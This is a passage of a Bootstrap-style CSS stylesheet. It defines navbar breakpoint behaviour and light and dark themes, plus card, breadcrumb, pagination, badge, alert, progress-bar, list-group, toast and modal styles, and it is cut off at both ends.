.container-fluid {    padding-right: 0;    padding-left: 0;  }}@media (min-width: 576px) {  .navbar-expand-sm {    -ms-flex-flow: row nowrap;    flex-flow: row nowrap;    -ms-flex-pack: start;    justify-content: flex-start;  }  .navbar-expand-sm .navbar-nav {    -ms-flex-direction: row;    flex-direction: row;  }  .navbar-expand-sm .navbar-nav .dropdown-menu {    position: absolute;  }  .navbar-expand-sm .navbar-nav .nav-link {    padding-right: 0.5rem;    padding-left: 0.5rem;  }  .navbar-expand-sm > .container,  .navbar-expand-sm > .container-fluid {    -ms-flex-wrap: nowrap;    flex-wrap: nowrap;  }  .navbar-expand-sm .navbar-collapse {    display: -ms-flexbox !important;    display: flex !important;    -ms-flex-preferred-size: auto;    flex-basis: auto;  }  .navbar-expand-sm .navbar-toggler {    display: none;  }}@media (max-width: 767.98px) {  .navbar-expand-md > .container,  .navbar-expand-md > .container-fluid {    padding-right: 0;    padding-left: 0;  }}@media (min-width: 768px) {  .navbar-expand-md {    -ms-flex-flow: row nowrap;    flex-flow: row nowrap;    -ms-flex-pack: start;    justify-content: flex-start;  }  .navbar-expand-md .navbar-nav {    -ms-flex-direction: row;    flex-direction: row;  }  .navbar-expand-md .navbar-nav .dropdown-menu {    position: absolute;  }  .navbar-expand-md .navbar-nav .nav-link {    padding-right: 0.5rem;    padding-left: 0.5rem;  }  .navbar-expand-md > .container,  .navbar-expand-md > .container-fluid {    -ms-flex-wrap: nowrap;    flex-wrap: nowrap;  }  .navbar-expand-md .navbar-collapse {    display: -ms-flexbox !important;    display: flex !important;    -ms-flex-preferred-size: auto;    flex-basis: auto;  }  .navbar-expand-md .navbar-toggler {    display: none;  }}@media (max-width: 991.98px) {  .navbar-expand-lg > .container,  .navbar-expand-lg > .container-fluid {    padding-right: 0;    padding-left: 0;  }}@media (min-width: 992px) {  .navbar-expand-lg {    -ms-flex-flow: row nowrap;    flex-flow: row nowrap;    -ms-flex-pack: start;    justify-content: flex-start;  }  .navbar-expand-lg .navbar-nav {    -ms-flex-direction: row;    flex-direction: row;  }  .navbar-expand-lg .navbar-nav .dropdown-menu {    position: absolute;  }  .navbar-expand-lg .navbar-nav .nav-link {    padding-right: 0.5rem;    padding-left: 0.5rem;  }  .navbar-expand-lg > .container,  .navbar-expand-lg > .container-fluid {    -ms-flex-wrap: nowrap;    flex-wrap: nowrap;  }  .navbar-expand-lg .navbar-collapse {    display: -ms-flexbox !important;    display: flex !important;    -ms-flex-preferred-size: auto;    flex-basis: auto;  }  .navbar-expand-lg .navbar-toggler {    display: none;  }}@media (max-width: 1199.98px) {  .navbar-expand-xl > .container,  .navbar-expand-xl > .container-fluid {    padding-right: 0;    padding-left: 0;  }}@media (min-width: 1200px) {  .navbar-expand-xl {    -ms-flex-flow: row nowrap;    flex-flow: row nowrap;    -ms-flex-pack: start;    justify-content: flex-start;  }  .navbar-expand-xl .navbar-nav {    -ms-flex-direction: row;    flex-direction: row;  }  .navbar-expand-xl .navbar-nav .dropdown-menu {    position: absolute;  }  .navbar-expand-xl .navbar-nav .nav-link {    padding-right: 0.5rem;    padding-left: 0.5rem;  }  .navbar-expand-xl > .container,  .navbar-expand-xl > .container-fluid {    -ms-flex-wrap: nowrap;    flex-wrap: nowrap;  }  .navbar-expand-xl .navbar-collapse {    display: -ms-flexbox !important;    display: flex !important;    -ms-flex-preferred-size: auto;    flex-basis: auto;  }  .navbar-expand-xl .navbar-toggler {    display: none;  }}.navbar-expand {  -ms-flex-flow: row nowrap;  flex-flow: row nowrap;  -ms-flex-pack: start;  justify-content: flex-start;}.navbar-expand > .container,.navbar-expand > .container-fluid {  padding-right: 0;  padding-left: 0;}.navbar-expand .navbar-nav {  -ms-flex-direction: row;  flex-direction: row;}.navbar-expand .navbar-nav .dropdown-menu {  position: absolute;}.navbar-expand .navbar-nav .nav-link {  padding-right: 0.5rem;  padding-left: 0.5rem;}.navbar-expand > .container,.navbar-expand > .container-fluid {  -ms-flex-wrap: nowrap;  flex-wrap: nowrap;}.navbar-expand .navbar-collapse {  display: -ms-flexbox !important;  display: flex !important;  -ms-flex-preferred-size: auto;  flex-basis: auto;}.navbar-expand .navbar-toggler {  display: none;}.navbar-light .navbar-brand {  color: rgba(0, 0, 0, 0.9);}.navbar-light .navbar-brand:hover, .navbar-light .navbar-brand:focus {  color: rgba(0, 0, 0, 0.9);}.navbar-light .navbar-nav .nav-link {  color: rgba(0, 0, 0, 0.5);}.navbar-light .navbar-nav .nav-link:hover, .navbar-light .navbar-nav .nav-link:focus {  color: rgba(0, 0, 0, 0.7);}.navbar-light .navbar-nav .nav-link.disabled {  color: rgba(0, 0, 0, 0.3);}.navbar-light .navbar-nav .show > .nav-link,.navbar-light .navbar-nav .active > .nav-link,.navbar-light .navbar-nav .nav-link.show,.navbar-light .navbar-nav .nav-link.active {  color: rgba(0, 0, 0, 0.9);}.navbar-light .navbar-toggler {  color: rgba(0, 0, 0, 0.5);  border-color: rgba(0, 0, 0, 0.1);}.navbar-light .navbar-toggler-icon {  background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3e%3cpath stroke='rgba(0, 0, 0, 0.5)' stroke-width='2' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");}.navbar-light .navbar-text {  color: rgba(0, 0, 0, 0.5);}.navbar-light .navbar-text a {  color: rgba(0, 0, 0, 0.9);}.navbar-light .navbar-text a:hover, .navbar-light .navbar-text a:focus {  color: rgba(0, 0, 0, 0.9);}.navbar-dark .navbar-brand {  color: #fff;}.navbar-dark .navbar-brand:hover, .navbar-dark .navbar-brand:focus {  color: #fff;}.navbar-dark .navbar-nav .nav-link {  color: rgba(255, 255, 255, 0.5);}.navbar-dark .navbar-nav .nav-link:hover, .navbar-dark .navbar-nav .nav-link:focus {  color: rgba(255, 255, 255, 0.75);}.navbar-dark .navbar-nav .nav-link.disabled {  color: rgba(255, 255, 255, 0.25);}.navbar-dark .navbar-nav .show > .nav-link,.navbar-dark .navbar-nav .active > .nav-link,.navbar-dark .navbar-nav .nav-link.show,.navbar-dark .navbar-nav .nav-link.active {  color: #fff;}.navbar-dark .navbar-toggler {  color: rgba(255, 255, 255, 0.5);  border-color: rgba(255, 255, 255, 0.1);}.navbar-dark .navbar-toggler-icon {  background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3e%3cpath stroke='rgba(255, 255, 255, 0.5)' stroke-width='2' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");}.navbar-dark .navbar-text {  color: rgba(255, 255, 255, 0.5);}.navbar-dark .navbar-text a {  color: #fff;}.navbar-dark .navbar-text a:hover, .navbar-dark .navbar-text a:focus {  color: #fff;}.card {  position: relative;  display: -ms-flexbox;  display: flex;  -ms-flex-direction: column;  flex-direction: column;  min-width: 0;  word-wrap: break-word;  background-color: #fff;  background-clip: border-box;  border: 1px solid rgba(0, 0, 0, 0.125);  border-radius: 0.25rem;}.card > hr {  margin-right: 0;  margin-left: 0;}.card > .list-group:first-child .list-group-item:first-child {  border-top-left-radius: 0.25rem;  border-top-right-radius: 0.25rem;}.card > .list-group:last-child .list-group-item:last-child {  border-bottom-right-radius: 0.25rem;  border-bottom-left-radius: 0.25rem;}.card-body {  -ms-flex: 1 1 auto;  flex: 1 1 auto;  padding: 1.25rem;}.card-title {  margin-bottom: 0.75rem;}.card-subtitle {  margin-top: -0.375rem;  margin-bottom: 0;}.card-text:last-child {  margin-bottom: 0;}.card-link:hover {  text-decoration: none;}.card-link + .card-link {  margin-left: 1.25rem;}.card-header {  padding: 0.75rem 1.25rem;  margin-bottom: 0;  background-color: rgba(0, 0, 0, 0.03);  border-bottom: 1px solid rgba(0, 0, 0, 0.125);}.card-header:first-child {  border-radius: calc(0.25rem - 1px) calc(0.25rem - 1px) 0 0;}.card-header + .list-group .list-group-item:first-child {  border-top: 0;}.card-footer {  padding: 0.75rem 1.25rem;  background-color: rgba(0, 0, 0, 0.03);  border-top: 1px solid rgba(0, 0, 0, 0.125);}.card-footer:last-child {  border-radius: 0 0 calc(0.25rem - 1px) calc(0.25rem - 1px);}.card-header-tabs {  margin-right: -0.625rem;  margin-bottom: -0.75rem;  margin-left: -0.625rem;  border-bottom: 0;}.card-header-pills {  margin-right: -0.625rem;  margin-left: -0.625rem;}.card-img-overlay {  position: absolute;  top: 0;  right: 0;  bottom: 0;  left: 0;  padding: 1.25rem;}.card-img {  width: 100%;  border-radius: calc(0.25rem - 1px);}.card-img-top {  width: 100%;  border-top-left-radius: calc(0.25rem - 1px);  border-top-right-radius: calc(0.25rem - 1px);}.card-img-bottom {  width: 100%;  border-bottom-right-radius: calc(0.25rem - 1px);  border-bottom-left-radius: calc(0.25rem - 1px);}.card-deck {  display: -ms-flexbox;  display: flex;  -ms-flex-direction: column;  flex-direction: column;}.card-deck .card {  margin-bottom: 15px;}@media (min-width: 576px) {  .card-deck {    -ms-flex-flow: row wrap;    flex-flow: row wrap;    margin-right: -15px;    margin-left: -15px;  }  .card-deck .card {    display: -ms-flexbox;    display: flex;    -ms-flex: 1 0 0%;    flex: 1 0 0%;    -ms-flex-direction: column;    flex-direction: column;    margin-right: 15px;    margin-bottom: 0;    margin-left: 15px;  }}.card-group {  display: -ms-flexbox;  display: flex;  -ms-flex-direction: column;  flex-direction: column;}.card-group > .card {  margin-bottom: 15px;}@media (min-width: 576px) {  .card-group {    -ms-flex-flow: row wrap;    flex-flow: row wrap;  }  .card-group > .card {    -ms-flex: 1 0 0%;    flex: 1 0 0%;    margin-bottom: 0;  }  .card-group > .card + .card {    margin-left: 0;    border-left: 0;  }  .card-group > .card:not(:last-child) {    border-top-right-radius: 0;    border-bottom-right-radius: 0;  }  .card-group > .card:not(:last-child) .card-img-top,  .card-group > .card:not(:last-child) .card-header {    border-top-right-radius: 0;  }  .card-group > .card:not(:last-child) .card-img-bottom,  .card-group > .card:not(:last-child) .card-footer {    border-bottom-right-radius: 0;  }  .card-group > .card:not(:first-child) {    border-top-left-radius: 0;    border-bottom-left-radius: 0;  }  .card-group > .card:not(:first-child) .card-img-top,  .card-group > .card:not(:first-child) .card-header {    border-top-left-radius: 0;  }  .card-group > .card:not(:first-child) .card-img-bottom,  .card-group > .card:not(:first-child) .card-footer {    border-bottom-left-radius: 0;  }}.card-columns .card {  margin-bottom: 0.75rem;}@media (min-width: 576px) {  .card-columns {    -webkit-column-count: 3;    -moz-column-count: 3;    column-count: 3;    -webkit-column-gap: 1.25rem;    -moz-column-gap: 1.25rem;    column-gap: 1.25rem;    orphans: 1;    widows: 1;  }  .card-columns .card {    display: inline-block;    width: 100%;  }}.accordion > .card {  overflow: hidden;}.accordion > .card:not(:first-of-type) .card-header:first-child {  border-radius: 0;}.accordion > .card:not(:first-of-type):not(:last-of-type) {  border-bottom: 0;  border-radius: 0;}.accordion > .card:first-of-type {  border-bottom: 0;  border-bottom-right-radius: 0;  border-bottom-left-radius: 0;}.accordion > .card:last-of-type {  border-top-left-radius: 0;  border-top-right-radius: 0;}.accordion > .card .card-header {  margin-bottom: -1px;}.breadcrumb {  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  padding: 0.75rem 1rem;  margin-bottom: 1rem;  list-style: none;  background-color: #e9ecef;  border-radius: 0.25rem;}.breadcrumb-item + .breadcrumb-item {  padding-left: 0.5rem;}.breadcrumb-item + .breadcrumb-item::before {  display: inline-block;  padding-right: 0.5rem;  color: #6c757d;  content: "/";}.breadcrumb-item + .breadcrumb-item:hover::before {  text-decoration: underline;}.breadcrumb-item + .breadcrumb-item:hover::before {  text-decoration: none;}.breadcrumb-item.active {  color: #6c757d;}.pagination {  display: -ms-flexbox;  display: flex;  padding-left: 0;  list-style: none;  border-radius: 0.25rem;}.page-link {  position: relative;  display: block;  padding: 0.5rem 0.75rem;  margin-left: -1px;  line-height: 1.25;  color: #007bff;  background-color: #fff;  border: 1px solid #dee2e6;}.page-link:hover {  z-index: 2;  color: #0056b3;  text-decoration: none;  background-color: #e9ecef;  border-color: #dee2e6;}.page-link:focus {  z-index: 2;  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.page-item:first-child .page-link {  margin-left: 0;  border-top-left-radius: 0.25rem;  border-bottom-left-radius: 0.25rem;}.page-item:last-child .page-link {  border-top-right-radius: 0.25rem;  border-bottom-right-radius: 0.25rem;}.page-item.active .page-link {  z-index: 1;  color: #fff;  background-color: #007bff;  border-color: #007bff;}.page-item.disabled .page-link {  color: #6c757d;  pointer-events: none;  cursor: auto;  background-color: #fff;  border-color: #dee2e6;}.pagination-lg .page-link {  padding: 0.75rem 1.5rem;  font-size: 1.25rem;  line-height: 1.5;}.pagination-lg .page-item:first-child .page-link {  border-top-left-radius: 0.3rem;  border-bottom-left-radius: 0.3rem;}.pagination-lg .page-item:last-child .page-link {  border-top-right-radius: 0.3rem;  border-bottom-right-radius: 0.3rem;}.pagination-sm .page-link {  padding: 0.25rem 0.5rem;  font-size: 0.875rem;  line-height: 1.5;}.pagination-sm .page-item:first-child .page-link {  border-top-left-radius: 0.2rem;  border-bottom-left-radius: 0.2rem;}.pagination-sm .page-item:last-child .page-link {  border-top-right-radius: 0.2rem;  border-bottom-right-radius: 0.2rem;}.badge {  display: inline-block;  padding: 0.25em 0.4em;  font-size: 75%;  font-weight: 700;  line-height: 1;  text-align: center;  white-space: nowrap;  vertical-align: baseline;  border-radius: 0.25rem;  transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;}@media (prefers-reduced-motion: reduce) {  .badge {    transition: none;  }}a.badge:hover, a.badge:focus {  text-decoration: none;}.badge:empty {  display: none;}.btn .badge {  position: relative;  top: -1px;}.badge-pill {  padding-right: 0.6em;  padding-left: 0.6em;  border-radius: 10rem;}.badge-primary {  color: #fff;  background-color: #007bff;}a.badge-primary:hover, a.badge-primary:focus {  color: #fff;  background-color: #0062cc;}a.badge-primary:focus, a.badge-primary.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.5);}.badge-secondary {  color: #fff;  background-color: #6c757d;}a.badge-secondary:hover, a.badge-secondary:focus {  color: #fff;  background-color: #545b62;}a.badge-secondary:focus, a.badge-secondary.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(108, 117, 125, 0.5);}.badge-success {  color: #fff;  background-color: #28a745;}a.badge-success:hover, a.badge-success:focus {  color: #fff;  background-color: #1e7e34;}a.badge-success:focus, a.badge-success.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.5);}.badge-info {  color: #fff;  background-color: #17a2b8;}a.badge-info:hover, a.badge-info:focus {  color: #fff;  background-color: #117a8b;}a.badge-info:focus, a.badge-info.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(23, 162, 184, 0.5);}.badge-warning {  color: #212529;  background-color: #ffc107;}a.badge-warning:hover, a.badge-warning:focus {  color: #212529;  background-color: #d39e00;}a.badge-warning:focus, a.badge-warning.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(255, 193, 7, 0.5);}.badge-danger {  color: #fff;  background-color: #dc3545;}a.badge-danger:hover, a.badge-danger:focus {  color: #fff;  background-color: #bd2130;}a.badge-danger:focus, a.badge-danger.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.5);}.badge-light {  color: #212529;  background-color: #f8f9fa;}a.badge-light:hover, a.badge-light:focus {  color: #212529;  background-color: #dae0e5;}a.badge-light:focus, a.badge-light.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(248, 249, 250, 0.5);}.badge-dark {  color: #fff;  background-color: #343a40;}a.badge-dark:hover, a.badge-dark:focus {  color: #fff;  background-color: #1d2124;}a.badge-dark:focus, a.badge-dark.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(52, 58, 64, 0.5);}.jumbotron {  padding: 2rem 1rem;  margin-bottom: 2rem;  background-color: #e9ecef;  border-radius: 0.3rem;}@media (min-width: 576px) {  .jumbotron {    padding: 4rem 2rem;  }}.jumbotron-fluid {  padding-right: 0;  padding-left: 0;  border-radius: 0;}.alert {  position: relative;  padding: 0.75rem 1.25rem;  margin-bottom: 1rem;  border: 1px solid transparent;  border-radius: 0.25rem;}.alert-heading {  color: inherit;}.alert-link {  font-weight: 700;}.alert-dismissible {  padding-right: 4rem;}.alert-dismissible .close {  position: absolute;  top: 0;  right: 0;  padding: 0.75rem 1.25rem;  color: inherit;}.alert-primary {  color: #004085;  background-color: #cce5ff;  border-color: #b8daff;}.alert-primary hr {  border-top-color: #9fcdff;}.alert-primary .alert-link {  color: #002752;}.alert-secondary {  color: #383d41;  background-color: #e2e3e5;  border-color: #d6d8db;}.alert-secondary hr {  border-top-color: #c8cbcf;}.alert-secondary .alert-link {  color: #202326;}.alert-success {  color: #155724;  background-color: #d4edda;  border-color: #c3e6cb;}.alert-success hr {  border-top-color: #b1dfbb;}.alert-success .alert-link {  color: #0b2e13;}.alert-info {  color: #0c5460;  background-color: #d1ecf1;  border-color: #bee5eb;}.alert-info hr {  border-top-color: #abdde5;}.alert-info .alert-link {  color: #062c33;}.alert-warning {  color: #856404;  background-color: #fff3cd;  border-color: #ffeeba;}.alert-warning hr {  border-top-color: #ffe8a1;}.alert-warning .alert-link {  color: #533f03;}.alert-danger {  color: #721c24;  background-color: #f8d7da;  border-color: #f5c6cb;}.alert-danger hr {  border-top-color: #f1b0b7;}.alert-danger .alert-link {  color: #491217;}.alert-light {  color: #818182;  background-color: #fefefe;  border-color: #fdfdfe;}.alert-light hr {  border-top-color: #ececf6;}.alert-light .alert-link {  color: #686868;}.alert-dark {  color: #1b1e21;  background-color: #d6d8d9;  border-color: #c6c8ca;}.alert-dark hr {  border-top-color: #b9bbbe;}.alert-dark .alert-link {  color: #040505;}@-webkit-keyframes progress-bar-stripes {  from {    background-position: 1rem 0;  }  to {    background-position: 0 0;  }}@keyframes progress-bar-stripes {  from {    background-position: 1rem 0;  }  to {    background-position: 0 0;  }}.progress {  display: -ms-flexbox;  display: flex;  height: 1rem;  overflow: hidden;  font-size: 0.75rem;  background-color: #e9ecef;  border-radius: 0.25rem;}.progress-bar {  display: -ms-flexbox;  display: flex;  -ms-flex-direction: column;  flex-direction: column;  -ms-flex-pack: center;  justify-content: center;  color: #fff;  text-align: center;  white-space: nowrap;  background-color: #007bff;  transition: width 0.6s ease;}@media (prefers-reduced-motion: reduce) {  .progress-bar {    transition: none;  }}.progress-bar-striped {  background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);  background-size: 1rem 1rem;}.progress-bar-animated {  -webkit-animation: progress-bar-stripes 1s linear infinite;  animation: progress-bar-stripes 1s linear infinite;}@media (prefers-reduced-motion: reduce) {  .progress-bar-animated {    -webkit-animation: none;    animation: none;  }}.media {  display: -ms-flexbox;  display: flex;  -ms-flex-align: start;  align-items: flex-start;}.media-body {  -ms-flex: 1;  flex: 1;}.list-group {  display: -ms-flexbox;  display: flex;  -ms-flex-direction: column;  flex-direction: column;  padding-left: 0;  margin-bottom: 0;}.list-group-item-action {  width: 100%;  color: #495057;  text-align: inherit;}.list-group-item-action:hover, .list-group-item-action:focus {  z-index: 1;  color: #495057;  text-decoration: none;  background-color: #f8f9fa;}.list-group-item-action:active {  color: #212529;  background-color: #e9ecef;}.list-group-item {  position: relative;  display: block;  padding: 0.75rem 1.25rem;  margin-bottom: -1px;  background-color: #fff;  border: 1px solid rgba(0, 0, 0, 0.125);}.list-group-item:first-child {  border-top-left-radius: 0.25rem;  border-top-right-radius: 0.25rem;}.list-group-item:last-child {  margin-bottom: 0;  border-bottom-right-radius: 0.25rem;  border-bottom-left-radius: 0.25rem;}.list-group-item.disabled, .list-group-item:disabled {  color: #6c757d;  pointer-events: none;  background-color: #fff;}.list-group-item.active {  z-index: 2;  color: #fff;  background-color: #007bff;  border-color: #007bff;}.list-group-horizontal {  -ms-flex-direction: row;  flex-direction: row;}.list-group-horizontal .list-group-item {  margin-right: -1px;  margin-bottom: 0;}.list-group-horizontal .list-group-item:first-child {  border-top-left-radius: 0.25rem;  border-bottom-left-radius: 0.25rem;  border-top-right-radius: 0;}.list-group-horizontal .list-group-item:last-child {  margin-right: 0;  border-top-right-radius: 0.25rem;  border-bottom-right-radius: 0.25rem;  border-bottom-left-radius: 0;}@media (min-width: 576px) {  .list-group-horizontal-sm {    -ms-flex-direction: row;    flex-direction: row;  }  .list-group-horizontal-sm .list-group-item {    margin-right: -1px;    margin-bottom: 0;  }  .list-group-horizontal-sm .list-group-item:first-child {    border-top-left-radius: 0.25rem;    border-bottom-left-radius: 0.25rem;    border-top-right-radius: 0;  }  .list-group-horizontal-sm .list-group-item:last-child {    margin-right: 0;    border-top-right-radius: 0.25rem;    border-bottom-right-radius: 0.25rem;    border-bottom-left-radius: 0;  }}@media (min-width: 768px) {  .list-group-horizontal-md {    -ms-flex-direction: row;    flex-direction: row;  }  .list-group-horizontal-md .list-group-item {    margin-right: -1px;    margin-bottom: 0;  }  .list-group-horizontal-md .list-group-item:first-child {    border-top-left-radius: 0.25rem;    border-bottom-left-radius: 0.25rem;    border-top-right-radius: 0;  }  .list-group-horizontal-md .list-group-item:last-child {    margin-right: 0;    border-top-right-radius: 0.25rem;    border-bottom-right-radius: 0.25rem;    border-bottom-left-radius: 0;  }}@media (min-width: 992px) {  .list-group-horizontal-lg {    -ms-flex-direction: row;    flex-direction: row;  }  .list-group-horizontal-lg .list-group-item {    margin-right: -1px;    margin-bottom: 0;  }  .list-group-horizontal-lg .list-group-item:first-child {    border-top-left-radius: 0.25rem;    border-bottom-left-radius: 0.25rem;    border-top-right-radius: 0;  }  .list-group-horizontal-lg .list-group-item:last-child {    margin-right: 0;    border-top-right-radius: 0.25rem;    border-bottom-right-radius: 0.25rem;    border-bottom-left-radius: 0;  }}@media (min-width: 1200px) {  .list-group-horizontal-xl {    -ms-flex-direction: row;    flex-direction: row;  }  .list-group-horizontal-xl .list-group-item {    margin-right: -1px;    margin-bottom: 0;  }  .list-group-horizontal-xl .list-group-item:first-child {    border-top-left-radius: 0.25rem;    border-bottom-left-radius: 0.25rem;    border-top-right-radius: 0;  }  .list-group-horizontal-xl .list-group-item:last-child {    margin-right: 0;    border-top-right-radius: 0.25rem;    border-bottom-right-radius: 0.25rem;    border-bottom-left-radius: 0;  }}.list-group-flush .list-group-item {  border-right: 0;  border-left: 0;  border-radius: 0;}.list-group-flush .list-group-item:last-child {  margin-bottom: -1px;}.list-group-flush:first-child .list-group-item:first-child {  border-top: 0;}.list-group-flush:last-child .list-group-item:last-child {  margin-bottom: 0;  border-bottom: 0;}.list-group-item-primary {  color: #004085;  background-color: #b8daff;}.list-group-item-primary.list-group-item-action:hover, .list-group-item-primary.list-group-item-action:focus {  color: #004085;  background-color: #9fcdff;}.list-group-item-primary.list-group-item-action.active {  color: #fff;  background-color: #004085;  border-color: #004085;}.list-group-item-secondary {  color: #383d41;  background-color: #d6d8db;}.list-group-item-secondary.list-group-item-action:hover, .list-group-item-secondary.list-group-item-action:focus {  color: #383d41;  background-color: #c8cbcf;}.list-group-item-secondary.list-group-item-action.active {  color: #fff;  background-color: #383d41;  border-color: #383d41;}.list-group-item-success {  color: #155724;  background-color: #c3e6cb;}.list-group-item-success.list-group-item-action:hover, .list-group-item-success.list-group-item-action:focus {  color: #155724;  background-color: #b1dfbb;}.list-group-item-success.list-group-item-action.active {  color: #fff;  background-color: #155724;  border-color: #155724;}.list-group-item-info {  color: #0c5460;  background-color: #bee5eb;}.list-group-item-info.list-group-item-action:hover, .list-group-item-info.list-group-item-action:focus {  color: #0c5460;  background-color: #abdde5;}.list-group-item-info.list-group-item-action.active {  color: #fff;  background-color: #0c5460;  border-color: #0c5460;}.list-group-item-warning {  color: #856404;  background-color: #ffeeba;}.list-group-item-warning.list-group-item-action:hover, .list-group-item-warning.list-group-item-action:focus {  color: #856404;  background-color: #ffe8a1;}.list-group-item-warning.list-group-item-action.active {  color: #fff;  background-color: #856404;  border-color: #856404;}.list-group-item-danger {  color: #721c24;  background-color: #f5c6cb;}.list-group-item-danger.list-group-item-action:hover, .list-group-item-danger.list-group-item-action:focus {  color: #721c24;  background-color: #f1b0b7;}.list-group-item-danger.list-group-item-action.active {  color: #fff;  background-color: #721c24;  border-color: #721c24;}.list-group-item-light {  color: #818182;  background-color: #fdfdfe;}.list-group-item-light.list-group-item-action:hover, .list-group-item-light.list-group-item-action:focus {  color: #818182;  background-color: #ececf6;}.list-group-item-light.list-group-item-action.active {  color: #fff;  background-color: #818182;  border-color: #818182;}.list-group-item-dark {  color: #1b1e21;  background-color: #c6c8ca;}.list-group-item-dark.list-group-item-action:hover, .list-group-item-dark.list-group-item-action:focus {  color: #1b1e21;  background-color: #b9bbbe;}.list-group-item-dark.list-group-item-action.active {  color: #fff;  background-color: #1b1e21;  border-color: #1b1e21;}.close {  float: right;  font-size: 1.5rem;  font-weight: 700;  line-height: 1;  color: #000;  text-shadow: 0 1px 0 #fff;  opacity: .5;}.close:hover {  color: #000;  text-decoration: none;}.close:not(:disabled):not(.disabled):hover, .close:not(:disabled):not(.disabled):focus {  opacity: .75;}button.close {  padding: 0;  background-color: transparent;  border: 0;  -webkit-appearance: none;  -moz-appearance: none;  appearance: none;}a.close.disabled {  pointer-events: none;}.toast {  max-width: 350px;  overflow: hidden;  font-size: 0.875rem;  background-color: rgba(255, 255, 255, 0.85);  background-clip: padding-box;  border: 1px solid rgba(0, 0, 0, 0.1);  box-shadow: 0 0.25rem 0.75rem rgba(0, 0, 0, 0.1);  -webkit-backdrop-filter: blur(10px);  backdrop-filter: blur(10px);  opacity: 0;  border-radius: 0.25rem;}.toast:not(:last-child) {  margin-bottom: 0.75rem;}.toast.showing {  opacity: 1;}.toast.show {  display: block;  opacity: 1;}.toast.hide {  display: none;}.toast-header {  display: -ms-flexbox;  display: flex;  -ms-flex-align: center;  align-items: center;  padding: 0.25rem 0.75rem;  color: #6c757d;  background-color: rgba(255, 255, 255, 0.85);  background-clip: padding-box;  border-bottom: 1px solid rgba(0, 0, 0, 0.05);}.toast-body {  padding: 0.75rem;}.modal-open {  overflow: hidden;}.modal-open .modal {  overflow-x: hidden;  overflow-y: auto;}.modal {  position: fixed;  top: 0;  left: 0;  z-index: 1050;  display: none;  width: 100%;  height: 100%;  overflow: hidden;  outline: 0;}.modal-dialog {  position: relative;  width: auto;  margin: 0.5rem;  pointer-events: none;}.modal.fade .modal-dialog {  transition: -webkit-transform 0.3s ease-out;  transition: transform 0.3s ease-out;  transition: transform 0.3s ease-out, -webkit-transform 0.3s ease-out;  -webkit-transform: translate(0, -50px);  transform: translate(0, -50px);}@media (prefers-reduced-motion: reduce) {  .modal.fade .modal-dialog {    transition: none;  }}.modal.show .modal-dialog {  -webkit-transform: none;  transform: none;}.modal-dialog-scrollable {  display: -ms-flexbox;  display: flex;  max-height: calc(100% - 1rem);}.modal-dialog-scrollable .modal-content {  max-height: calc(100vh - 1rem);  overflow: hidden;}.modal-dialog-scrollable .modal-header,.modal-dialog-scrollable .modal-footer {  -ms-flex-negative: 0;  flex-shrink: 0;}.modal-dialog-scrollable .modal-body {  overflow-y: auto;}.modal-dialog-centered {  display: -ms-flexbox;  display: flex;  -ms-flex-align: center;  align-items: center;  min-height: calc(100% - 1rem);}.modal-dialog-centered::before {  display: block;  height: calc(100vh - 1rem);  content: "";}.modal-dialog-centered.modal-dialog-scrollable {  -ms-flex-direction: column;  flex-direction: column;  -ms-flex-pack: center;  justify-content: center;  height: 100%;}.modal-dialog-centered.modal-dialog-scrollable .modal-content {  max-height: none;}.modal-dialog-centered.modal-dialog-scrollable::before {  content: none;}.modal-content {  position: relative;  display: -ms-flexbox;  display: flex;  -ms-flex-direction: column;  flex-direction: column;  width: 100%;  pointer-events: auto;  background-color: #fff;  background-clip: padding-box;  border: 1px solid rgba(0, 0, 0, 0.2);  border-radius: 0.3rem;  outline: 0;}.modal-backdrop {  position: fixed;  top: 0;  left: 0;  z-index: 1040;  width: 100vw;  height: 100vh;  background-color: #000;}.modal-backdrop.fade {  opacity: 0;}.modal-backdrop.show {  opacity: 0.5;}.modal-header {  display: -ms-flexbox;  display: flex;  -ms-flex-align: start;  align-items: flex-start;  -ms-flex-pack: justify;  justify-content: space-between;  padding: 1rem 1rem;  border-bottom: 1px solid #dee2e6;  border-top-left-radius: 0.3rem;  border-top-right-radius: 0.3rem;}.modal-header .close {  padding: 1rem 1rem;  margin: -1rem -1rem -1rem auto;}.modal-title {  margin-bottom: 0;  line-height: 1.5;}.modal-body {  position: relative;  -ms-flex: 1 1 auto;  flex: 1 1 auto;  padding: 1rem;}.modal-footer {  display: -ms-flexbox;  display: flex;  -ms-flex-align: center;  align-items: center;  -ms-flex-pack: end;  justify-content: flex-end;  padding: 1rem;  border-top: 1px solid #dee2e6;  border-bottom-right-radius: 0.3rem;  border-bottom-left-radius: 0.3rem;}.modal-footer > :not(:first-child) {  margin-left: .25rem;}.modal-footer > :not(:last-child) {  margin-right: .25rem;}.modal-scrollbar-measure {  position: absolute;  top: -9999px;  width: 50px;  height: 50px;  overflow: scroll;}@media (min-width: 576px) {  .modal-dialog {    max-width: 500px;    margin: 1.75rem auto;  }  .modal-dialog-scrollable {    max-height: calc(100% - 3.5rem);  }  .modal-dialog-scrollable .modal-content {    max-height: calc(100vh - 3.5rem);  }  .modal-dialog-centered {    min-height: calc(100% 